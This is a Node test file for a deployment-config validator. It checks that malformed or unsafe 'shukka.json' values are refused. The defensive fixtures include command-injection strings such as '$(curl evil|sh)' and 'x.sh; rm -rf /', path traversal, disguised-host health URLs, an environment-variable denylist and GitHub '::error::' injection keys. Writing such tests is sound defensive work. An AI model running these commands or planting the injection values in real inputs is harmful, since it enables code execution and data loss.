import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { checkProjectName, derivedNames, loadConfig, validateConfig } from '../scripts/config.mjs';

const here = dirname(fileURLToPath(import.meta.url));
const root = join(here, '..');
const script = join(root, 'scripts', 'config.mjs');
const examplePath = join(here, 'fixtures', 'config', 'trendigle.json');

// Tests mutate the parsed JSON at arbitrary depth, so it is deliberately loosely typed.
// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Loose = Record<string, any>;

/** A fresh copy of the design's Trendigle example, safe to mutate. */
function example(): Loose {
  return JSON.parse(readFileSync(examplePath, 'utf8'));
}

/** Validate and return the problems, asserting that at least one mentions `fragment`. */
function problemsFor(config: unknown, fragment: RegExp): string[] {
  const { problems } = validateConfig(config);
  assert.ok(problems.length > 0, 'expected the config to be refused');
  assert.ok(
    problems.some((p) => fragment.test(p)),
    `expected a problem matching ${fragment}, got:\n${problems.join('\n')}`,
  );
  for (const p of problems) assert.ok(!p.includes('\n'), `a problem spans lines: ${p}`);
  return problems;
}

test('shu-9wa: the design example in docs matches the fixture', () => {
  const design = readFileSync(join(root, 'docs', 'factory', 'v1', 'design.md'), 'utf8');
  const block = design.split('### `shukka.json`')[1]?.split('```json')[1]?.split('```')[0];
  assert.ok(block, 'design has a shukka.json example');
  assert.deepEqual(JSON.parse(block), example());
});

test("shu-9wa: the design's Trendigle example validates against the schema", () => {
  const { problems } = validateConfig(example());
  assert.deepEqual(problems, []);
});

test('shu-9wa: the schema names exactly the contract keys', () => {
  const schema = JSON.parse(readFileSync(join(root, 'schema', 'shukka.schema.json'), 'utf8'));
  assert.deepEqual(Object.keys(schema.properties).sort(), [
    '$schema', 'alwaysDeploy', 'apps', 'aws', 'checks', 'fence', 'infra', 'node', 'project', 'qualifier', 'smoke',
  ]);
  assert.equal(schema.additionalProperties, false);
  const app = schema.definitions.app;
  assert.deepEqual(Object.keys(app.properties).sort(), ['build', 'name', 'paths', 'server']);
  assert.deepEqual(Object.keys(app.properties.build.properties).sort(), ['buildEnv', 'bundle', 'dir', 'env', 'run']);
  assert.deepEqual(Object.keys(app.properties.server.properties).sort(), ['configure', 'health', 'units']);
});

test('shu-9wa: project format is enforced', () => {
  for (const bad of ['Trendigle', '1trendigle', 'a', 'trend_igle', 'x'.repeat(22)]) {
    const c = example();
    c.project = bad;
    problemsFor(c, /^shukka\.json: project: /);
  }
  const c = example();
  c.project = 'my-app-2';
  assert.deepEqual(validateConfig(c).problems, []);
});

test('shu-9wa: qualifier format is enforced', () => {
  for (const bad of ['Trend', '1trend', 'tr-end', 'a']) {
    const c = example();
    c.qualifier = bad;
    problemsFor(c, /^shukka\.json: qualifier: /);
  }
});

test('shu-9wa: qualifier is at most 10 lowercase alphanumerics', () => {
  const c = example();
  c.qualifier = 'abcdefghijk';
  problemsFor(c, /^shukka\.json: qualifier: .*\^\[a-z0-9\]\{1,10\}\$/);
  c.qualifier = 'abcdefghij';
  assert.deepEqual(validateConfig(c).problems, []);
});

test('shu-9wa: unknown keys are refused at every level', () => {
  const c = example();
  c.roles = { infra: 'arn:aws:iam::1:role/x' };
  c.aws.profile = 'stelking';
  c.apps[0].server.port = 3200;
  const problems = problemsFor(c, /^shukka\.json: roles: unknown key$/);
  assert.ok(problems.includes('shukka.json: aws.profile: unknown key'), problems.join('\n'));
  assert.ok(problems.includes('shukka.json: apps[0].server.port: unknown key'), problems.join('\n'));
});

test('shu-9wa: Object.prototype names are unknown keys, not known ones', () => {
  const c = example();
  Object.defineProperty(c, 'constructor', { value: 1, enumerable: true });
  c.aws.toString = 'x';
  const { problems } = validateConfig(c);
  assert.ok(problems.includes('shukka.json: constructor: unknown key'), problems.join('\n'));
  assert.ok(problems.includes('shukka.json: aws.toString: unknown key'), problems.join('\n'));
  const parsed = JSON.parse(JSON.stringify(example()).replace('"configure":', '"__proto__": 1, "configure":'));
  assert.ok(validateConfig(parsed).problems.includes('shukka.json: apps[0].server.__proto__: unknown key'), validateConfig(parsed).problems.join('\n'));
});

test('shu-9wa: missing commands are refused', () => {
  const cases: Array<[(c: Loose) => void, RegExp]> = [
    [(c) => { delete c.apps[0].build.run; }, /^shukka\.json: apps\[0\]\.build: missing required key "run"$/],
    [(c) => { c.apps[1].build.run = []; }, /^shukka\.json: apps\[1\]\.build\.run: /],
    [(c) => { c.checks[0].run = ['npm ci', '  ']; }, /^shukka\.json: checks\[0\]\.run\[1\]: /],
    [(c) => { delete c.checks[1].run; }, /^shukka\.json: checks\[1\]: missing required key "run"$/],
    [(c) => { delete c.apps[0].build.bundle; }, /^shukka\.json: apps\[0\]\.build: missing required key "bundle"$/],
    [(c) => { delete c.apps[0].server.configure; }, /^shukka\.json: apps\[0\]\.server: missing required key "configure"$/],
    [(c) => { c.smoke = {}; }, /^shukka\.json: smoke: missing required key "run"$/],
    [(c) => { c.smoke.run = ''; }, /^shukka\.json: smoke\.run: /],
  ];
  for (const [mutate, fragment] of cases) {
    const c = example();
    mutate(c);
    problemsFor(c, fragment);
  }
});

test('shu-9wa: health must be an http URL', () => {
  for (const bad of ['127.0.0.1:3200/login', 'ftp://127.0.0.1/login', 'http://', 'http:// x', 'file:///etc/passwd']) {
    const c = example();
    c.apps[0].server.health = bad;
    problemsFor(c, /^shukka\.json: apps\[0\]\.server\.health: /);
  }
  const c = example();
  c.apps[0].server.health = 'https://localhost';
  assert.deepEqual(validateConfig(c).problems, []);
});

test('shu-9wa: app names must be unique', () => {
  const c = example();
  c.apps[1].name = 'app';
  problemsFor(c, /^shukka\.json: apps\[1\]\.name: duplicate app name "app"/);
});

test('shu-9wa: every problem is reported, one line each', () => {
  const c = example();
  c.project = 'Bad';
  c.qualifier = 'waytoolongqualifier';
  c.extra = true;
  c.apps[0].server.health = 'nope';
  const { problems } = validateConfig(c);
  assert.ok(problems.length >= 4, problems.join('\n'));
});

test('shu-9wa: a project name that prefixes or is prefixed by a known name is refused', () => {
  assert.deepEqual(checkProjectName('trendigle', ['orbitary']), []);
  assert.deepEqual(checkProjectName('trendigle', ['trendigle']), [], 'its own name is not a conflict');
  assert.match(checkProjectName('trend', ['orbitary', 'trendigle'])[0] ?? '', /^project: "trend" is a prefix of known project "trendigle"$/);
  assert.match(checkProjectName('trendigle2', ['trendigle'])[0] ?? '', /^project: known project "trendigle" is a prefix of "trendigle2"$/);
  const c = example();
  c.project = 'trend';
  assert.deepEqual(validateConfig(c, { knownProjects: ['trendigle'] }).problems, [
    'shukka.json: project: "trend" is a prefix of known project "trendigle"',
  ]);
  assert.deepEqual(validateConfig(c).problems, [], 'no list, no prefix check');
});

test('shu-9wa: role and stack names are derived for the example', () => {
  assert.deepEqual(derivedNames('trendigle'), {
    infra: 'trendigle-shukka-infra',
    app: 'trendigle-shukka-app',
    diff: 'trendigle-shukka-diff',
  });
  const { config } = validateConfig(example());
  assert.deepEqual(config?.derived, {
    infra: 'trendigle-shukka-infra',
    app: 'trendigle-shukka-app',
    diff: 'trendigle-shukka-diff',
  });
  const c = example();
  c.derived = { infra: 'x' };
  problemsFor(c, /^shukka\.json: derived: unknown key$/);
});

test('shu-9wa: loadConfig reads a file and reports unreadable or invalid JSON as one problem', () => {
  const dir = mkdtempSync(join(tmpdir(), 'shu-9wa-'));
  try {
    assert.deepEqual(loadConfig(examplePath).problems, []);
    assert.match(loadConfig(join(dir, 'missing.json')).problems[0] ?? '', /^shukka\.json: cannot read /);
    writeFileSync(join(dir, 'bad.json'), '{ "project": ');
    const bad = loadConfig(join(dir, 'bad.json'));
    assert.equal(bad.problems.length, 1);
    assert.match(bad.problems[0] ?? '', /^shukka\.json: not valid JSON: /);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('shu-9wa: CLI --json prints the normalised config', () => {
  const out = execFileSync(process.execPath, [script, examplePath, '--json'], { encoding: 'utf8' });
  const config = JSON.parse(out);
  assert.equal(config.$schema, undefined);
  assert.equal(config.project, 'trendigle');
  assert.equal(config.node, '22');
  assert.equal(config.alwaysDeploy, false);
  assert.deepEqual(config.apps[1].build.env, {});
  assert.deepEqual(config.apps[1].build.buildEnv, []);
  assert.deepEqual(config.apps[0].build.buildEnv, ['LEGAL_ENTITY', 'CONTACT_EMAIL']);
  assert.equal(config.derived.diff, 'trendigle-shukka-diff');
});

test('shu-9wa: CLI fills defaults for a minimal config', () => {
  const dir = mkdtempSync(join(tmpdir(), 'shu-9wa-'));
  try {
    const c = example();
    delete c.node; delete c.checks; delete c.smoke; delete c.alwaysDeploy;
    writeFileSync(join(dir, 'shukka.json'), JSON.stringify(c));
    const config = JSON.parse(execFileSync(process.execPath, [script, join(dir, 'shukka.json'), '--json'], { encoding: 'utf8' }));
    assert.equal(config.node, '22');
    assert.deepEqual(config.checks, []);
    assert.equal(config.smoke, null);
    assert.equal(config.alwaysDeploy, false);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('shu-9wa: CLI exits non-zero with one line per problem', () => {
  const dir = mkdtempSync(join(tmpdir(), 'shu-9wa-'));
  try {
    const c = example();
    c.project = 'Bad';
    c.apps[1].name = 'app';
    c.unknown = 1;
    writeFileSync(join(dir, 'shukka.json'), JSON.stringify(c));
    const run = spawnSync(process.execPath, [script, join(dir, 'shukka.json'), '--json'], { encoding: 'utf8' });
    assert.equal(run.status, 1);
    assert.equal(run.stdout, '');
    const lines = run.stderr.trim().split('\n');
    assert.equal(lines.length, 3, run.stderr);
    assert.ok(lines.some((l) => l.startsWith('shukka.json: project: ')));
    assert.ok(lines.some((l) => l.startsWith('shukka.json: apps[1].name: ')));
    assert.ok(lines.includes('shukka.json: unknown: unknown key'));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('shu-9wa: CLI --known refuses a prefix clash', () => {
  const run = spawnSync(process.execPath, [script, examplePath, '--known', 'orbitary,trendigleadmin'], { encoding: 'utf8' });
  assert.equal(run.status, 1);
  assert.equal(run.stderr.trim(), 'shukka.json: project: "trendigle" is a prefix of known project "trendigleadmin"');
  const ok = spawnSync(process.execPath, [script, examplePath, '--known', 'orbitary'], { encoding: 'utf8' });
  assert.equal(ok.status, 0, ok.stderr);
});

test('shu-9wa: CLI without a path prints usage and exits 2', () => {
  const run = spawnSync(process.execPath, [script], { encoding: 'utf8' });
  assert.equal(run.status, 2);
  assert.match(run.stderr, /usage: node scripts\/config\.mjs <path>/);
});

// ---- shu-9bj.1: config hardening ----

/** Problems with the fixed line prefix removed, asserting every line carries it. */
function bare(problems: string[]): string[] {
  for (const p of problems) assert.ok(p.startsWith(PREFIX), `problem lacks the prefix: ${p}`);
  return problems.map((p) => p.slice(PREFIX.length));
}

const PREFIX = 'shukka.json: ';

/** Assert that setting a field to `value` is refused with a problem at `at`. */
function refused(set: (c: Loose, v: unknown) => void, value: unknown, at: string): void {
  const c = example();
  set(c, value);
  const { problems, config } = validateConfig(c);
  assert.equal(config, null, `expected ${JSON.stringify(value)} at ${at} to be refused`);
  assert.ok(
    bare(problems).some((p) => p.startsWith(`${at}: `)),
    `expected a problem at ${at} for ${JSON.stringify(value)}, got:\n${problems.join('\n')}`,
  );
}

const BAD_PATHS = [
  '/etc/x.sh',
  '../../../etc/x.sh',
  '..',
  '../..',
  'implementation/../../x',
  'a/..',
  '--help',
  '-x',
  'implementation/app\nx',
  'implementation/app\tx',
  'a\u0000b',
  'a\u007fb',
  '$(curl evil|sh)',
  '`id`',
  'x.sh; rm -rf /',
  'x.sh && id',
  'x.sh | sh',
  'bash x.sh',
  '',
];

const PATH_FIELDS: Array<[string, (c: Loose, v: unknown) => void]> = [
  ['infra.dir', (c, v) => { c.infra.dir = v; }],
  ['infra.paths[0]', (c, v) => { c.infra.paths[0] = v; }],
  ['checks[0].dir', (c, v) => { c.checks[0].dir = v; }],
  ['apps[0].paths[0]', (c, v) => { c.apps[0].paths[0] = v; }],
  ['apps[0].build.dir', (c, v) => { c.apps[0].build.dir = v; }],
  ['apps[0].build.bundle', (c, v) => { c.apps[0].build.bundle = v; }],
  ['apps[0].server.configure', (c, v) => { c.apps[0].server.configure = v; }],
];

for (const [at, set] of PATH_FIELDS) {
  test(`shu-9bj.1: ${at} refuses absolute, .., leading -, control characters and commands`, () => {
    for (const bad of BAD_PATHS) refused(set, bad, at);
  });
}

test('shu-9bj.1: relative paths, dot directories and globs in paths are accepted', () => {
  const c = example();
  c.infra.dir = '.';
  c.checks[0].dir = './implementation/app';
  c.apps[0].build.dir = 'implementation/app-v2_x.y';
  c.apps[0].build.bundle = './scripts/bundle.sh';
  c.apps[0].server.configure = 'box/configure-app.sh';
  c.infra.paths = ['implementation/infra/**', 'a/*.json', 'b/**/c?.ts', '.github/workflows/ci.yml'];
  assert.deepEqual(validateConfig(c).problems, []);
});

test('shu-9bj.1: dir, configure and bundle are plain paths, not globs', () => {
  refused((c, v) => { c.apps[0].server.configure = v; }, 'box/*.sh', 'apps[0].server.configure');
  refused((c, v) => { c.apps[0].build.bundle = v; }, 'scripts/bundle?.sh', 'apps[0].build.bundle');
  refused((c, v) => { c.infra.dir = v; }, 'implementation/**', 'infra.dir');
});

test("shu-9bj.1: unit names start with an alphanumeric and use systemd's unit-name characters", () => {
  const at = 'apps[0].server.units[0]';
  const set = (c: Loose, v: unknown) => { c.apps[0].server.units[0] = v; };
  for (const bad of ['-H', '--host=evil', '.hidden', '@x', ':x', '_x', 'a b', 'a;id', 'a$(id)', 'a\\x2d', 'a/b', 'a\nb', '', 'a'.repeat(256)]) {
    refused(set, bad, at);
  }
  const c = example();
  c.apps[0].server.units = ['trendigle', 'trendigle-tick', 'app@1.service', 'x_y:z.timer', '9lives'];
  assert.deepEqual(validateConfig(c).problems, []);
});

test('shu-9bj.1: health is an http(s) URL to 127.0.0.1 or localhost with URL-safe characters only', () => {
  const at = 'apps[0].server.health';
  const set = (c: Loose, v: unknown) => { c.apps[0].server.health = v; };
  for (const bad of [
    'http://127.0.0.1:3200/$(id)',
    'http://127.0.0.1:3200/`id`',
    'http://127.0.0.1:3200/login;id',
    'http://127.0.0.1:3200/login|sh',
    'http://127.0.0.1:3200/login&id',
    "http://127.0.0.1:3200/lo'gin",
    'http://127.0.0.1:3200/lo"gin',
    'http://127.0.0.1:3200/lo gin',
    'http://127.0.0.1:3200/login\nid',
    'http://user:pass@127.0.0.1:3200/login',
    'http://evil.com@127.0.0.1/login',
    'http://127.0.0.1@evil.com/login',
    'http://localhost.evil.com/login',
    'http://127.0.0.1.evil.com/',
    'https://example.com',
    'http://10.0.0.1:3200/login',
    'http://[::1]:3200/login',
    'ftp://127.0.0.1/login',
    'http://127.0.0.1:99999/login',
    'http://127.0.0.1:/login',
  ]) {
    refused(set, bad, at);
  }
  for (const good of [
    'http://127.0.0.1:3200/login',
    'https://localhost:8443/healthz',
    'http://localhost',
    'http://127.0.0.1/',
    'http://localhost:3000/api/health?full=1',
    'http://127.0.0.1:3200/a-b_c.d~e/%20',
  ]) {
    const c = example();
    c.apps[0].server.health = good;
    assert.deepEqual(validateConfig(c).problems, [], good);
  }
});

test('shu-9bj.1: build.env names refuse the denylist and values refuse newlines', () => {
  for (const name of ['PATH', 'NODE_OPTIONS', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'GITHUB_ENV', 'GITHUB_PATH', 'GITHUB_OUTPUT', 'RUNNER_TEMP', 'AWS_ACCESS_KEY_ID', 'AWS_REGION', '__proto__']) {
    const c = JSON.parse(JSON.stringify(example()).replace('"APP_URL":', `"${name}": "x", "APP_URL":`));
    const { problems, config } = validateConfig(c);
    assert.equal(config, null, `${name} accepted`);
    assert.ok(
      bare(problems).some((p) => p.startsWith(`apps[0].build.env.${name} (name): `)),
      `${name}: ${problems.join('\n')}`,
    );
  }
  for (const value of ['a\nb', 'a\rb', 'x\nGITHUB_ENV=y', 'a\u0000b']) {
    refused((c, v) => { c.apps[0].build.env.APP_URL = v; }, value, 'apps[0].build.env.APP_URL');
  }
  const c = example();
  c.apps[0].build.env = { APP_URL: 'https://trendigle.com', NEXT_PUBLIC_X: 'a b; c', PATHNAME: 'x', MY_AWS_THING: 'y' };
  assert.deepEqual(validateConfig(c).problems, []);
});

test('shu-9bj.1: buildEnv names refuse the same denylist', () => {
  for (const name of ['PATH', 'NODE_OPTIONS', 'GITHUB_ENV', 'AWS_SECRET_ACCESS_KEY', 'LD_PRELOAD', 'RUNNER_OS', '__proto__']) {
    refused((c, v) => { c.apps[0].build.buildEnv = [v]; }, name, 'apps[0].build.buildEnv[0]');
  }
});

test('shu-9bj.1: problem lines never begin with text from the file and :: is escaped', () => {
  const c = example();
  c['::error file=x::pwned'] = 1;
  c.aws['::warning::w'] = 1;
  c.apps[0].build.env['::set-env name=X::y'] = 'v';
  c['a\n::error::split'] = 1;
  c.apps[0].server.health = 'http://x::error::y';
  const { problems } = validateConfig(c);
  assert.ok(problems.length >= 5, problems.join('\n'));
  for (const p of problems) {
    assert.ok(p.startsWith(PREFIX), `not prefixed: ${p}`);
    assert.ok(!p.includes('::'), `:: not escaped: ${p}`);
    // eslint-disable-next-line no-control-regex -- asserting control characters are gone
    assert.ok(!/[\u0000-\u001f\u007f]/u.test(p), `control character in: ${JSON.stringify(p)}`);
  }
  const dir = mkdtempSync(join(tmpdir(), 'shu-9bj.1-'));
  try {
    writeFileSync(join(dir, 'shukka.json'), JSON.stringify(c));
    const run = spawnSync(process.execPath, [script, join(dir, 'shukka.json')], { encoding: 'utf8' });
    assert.equal(run.status, 1);
    for (const line of run.stderr.trim().split('\n')) {
      assert.ok(line.startsWith(PREFIX), `stderr line not prefixed: ${line}`);
      assert.ok(!line.includes('::'), `stderr line has ::: ${line}`);
    }
    writeFileSync(join(dir, 'bad.json'), '{ "::error::x": ');
    for (const p of loadConfig(join(dir, 'bad.json')).problems) assert.ok(p.startsWith(PREFIX), p);
    for (const p of loadConfig(join(dir, 'missing::error::.json')).problems) {
      assert.ok(p.startsWith(PREFIX) && !p.includes('::'), p);
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("shu-9bj.1: the design's Trendigle example still validates", () => {
  const { problems, config } = validateConfig(example());
  assert.deepEqual(problems, []);
  assert.equal(config?.apps[0]?.server.health, 'http://127.0.0.1:3200/login');
  assert.equal(config?.apps[0]?.server.configure, 'implementation/infra/box/configure-app.sh');
  assert.deepEqual(loadConfig(examplePath).problems, []);
});

test('shu-9zr: aws.deployBucket defaults to <project>-deploy-<account> and can be set', () => {
  const raw = JSON.parse(readFileSync(join(here, 'fixtures', 'config', 'trendigle.json'), 'utf8'));
  const plain = validateConfig(raw);
  assert.equal(plain.config?.aws.deployBucket, `trendigle-deploy-${raw.aws.account}`);
  raw.aws.deployBucket = `trendigle-prod-deploy-${raw.aws.account}`;
  assert.equal(validateConfig(raw).config?.aws.deployBucket, `trendigle-prod-deploy-${raw.aws.account}`);
  raw.aws.deployBucket = 'Not A Bucket';
  const bad = validateConfig(raw);
  assert.equal(bad.config, null);
  assert.ok(bad.problems.some((p) => p.startsWith('shukka.json: aws.deployBucket')), bad.problems.join('\n'));
});

test('shu-9bj.9: aws.deployBucket must start with the project name (the fence covers only <project>* buckets)', () => {
  const raw = JSON.parse(readFileSync(join(here, 'fixtures', 'config', 'trendigle.json'), 'utf8'));
  for (const ok of ['trendigle-deploy-123456789012', 'trendigle-prod-deploy', 'trendigledeploy']) {
    raw.aws.deployBucket = ok;
    assert.deepEqual(validateConfig(raw).problems, [], ok);
  }
  for (const bad of ['orbitary-deploy-123456789012', 'deploy-trendigle', 'shared-artifacts', 'trendigl-deploy']) {
    raw.aws.deployBucket = bad;
    const r = validateConfig(raw);
    assert.equal(r.config, null, bad);
    assert.ok(r.problems.some((p) => p.startsWith('shukka.json: aws.deployBucket') && p.includes('must start with the project name')), r.problems.join('\n'));
  }
});
